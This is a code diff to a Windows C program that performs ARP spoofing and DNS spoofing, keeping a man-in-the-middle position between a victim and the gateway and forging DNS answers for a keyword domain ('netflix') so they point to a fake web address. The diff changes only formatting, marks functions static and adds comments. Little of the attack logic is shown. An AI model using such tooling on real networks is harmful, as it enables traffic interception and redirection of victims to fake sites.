@@ -14,7 +14,12 @@ send_params infect_params;
 static char* keyword = "netflix";
 u_long fake_web = 264000259; // TODO 
 
-void stop_arp_spoofing()
+/*
+* @purpose: adding the correct arp entries to the victim and gateway machines.
+* @params: None.
+* @return: void.
+*/
+static void stop_arp_spoofing()
 {
 	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
 
@@ -44,7 +49,14 @@ void stop_arp_spoofing()
 	pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
 }
 
-DWORD WINAPI start_arp_spoofing(LPVOID lparam)
+/*
+* @purpose: keep sending fake arp packets to maintain MITM.
+* @params: thread syntax.
+* @return 0.
+*/
+static DWORD WINAPI start_arp_spoofing(
+	LPVOID lparam
+)
 {
 	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
 
@@ -88,7 +100,10 @@ DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 * @return:	void.
 * 
 */
-static void change_packet_sizes(u_char* packet, void* const end_packet)
+static void change_packet_sizes(
+	u_char* packet, 
+	void* const end_packet
+)
 {
 	/* locals */
 	ip_hdr* ip_header;
@@ -109,7 +124,7 @@ static void change_packet_sizes(u_char* packet, void* const end_packet)
 * @return:	the pointer to the end of the packet.
 * 
 */
-void* create_fake_dns_respones(
+static void* create_fake_dns_respones(
 	void* const pDnsSection, 
 	void* const pAnswerSection, 
 	void* const pQuestion
@@ -142,7 +157,10 @@ void* create_fake_dns_respones(
 * @return: size of new packet (same size if not the DNS)
 * 
 */
-size_t dns_spoofing(u_char* packet, size_t packet_size)
+static size_t dns_spoofing(
+	u_char* packet, 
+	size_t packet_size
+)
 {
 	/* check if valid DNS packet */
 	ether_hdr* eth_header = (ether_hdr*)packet;
@@ -187,7 +205,9 @@ size_t dns_spoofing(u_char* packet, size_t packet_size)
 	return (BYTE*)temp_p - packet;
 }
 
-DWORD WINAPI infect(LPVOID lparam)
+DWORD WINAPI infect(
+	LPVOID lparam
+)
 {
 	pCommand command = (pCommand)lparam;
 
